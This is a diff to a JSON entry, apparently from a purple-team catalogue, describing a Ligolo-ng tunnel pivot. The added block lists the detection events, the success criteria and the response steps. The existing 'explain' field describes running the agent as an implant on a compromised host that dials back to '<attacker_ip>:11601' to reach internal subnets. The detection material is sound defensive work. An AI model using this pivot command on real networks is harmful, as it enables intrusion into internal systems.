@@ -197,6 +197,35 @@
       "better_with": [
         "edr"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "Ligolo-ng - TUN-Interface Pivot (no proxychains) - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "3",
+          "description": "Network connection (Sysmon)"
+        },
+        {
+          "source": "windows-security",
+          "description": "net_ligolo_ng_agent_tunnel"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Sysmon, Windows Security Event Log for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Connects the Ligolo-ng agent on a compromised pivot back to your proxy, creating a virtual TUN interface locally:\n  ./agent          the implant run on the pivot\n  -connect <attacker_ip>:11601   dial back to the proxy you started with -selfcert\n  -ignore-cert     accept the proxy's self-signed TLS cert\nAfter 'session' + a route to the subnet via the ligolo interface + 'start', you reach the internal network with normal tools - no proxychains."
